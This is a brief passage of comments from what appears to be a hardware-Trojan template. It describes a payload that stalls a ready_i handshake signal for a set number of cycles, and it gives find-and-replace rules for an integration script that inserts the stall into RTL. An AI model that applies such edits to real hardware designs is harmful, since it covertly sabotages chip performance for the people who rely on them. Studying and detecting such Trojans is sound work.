 ...
 * Payload: Delay ready_i by N cycles
 * 
...
// ============================================================
// Performance Degradation: Delay ready_i by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF ready_i is a ready/valid signal:
//   Find: assign ready_i = ready_condition;
//   Replace: assign ready_i = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF ready_i is in always_ff:
//   Find: ready_i <= ready_value;
//   Replace: ready_i <= (delay_counter == 0) ? ready_value : 1'b0;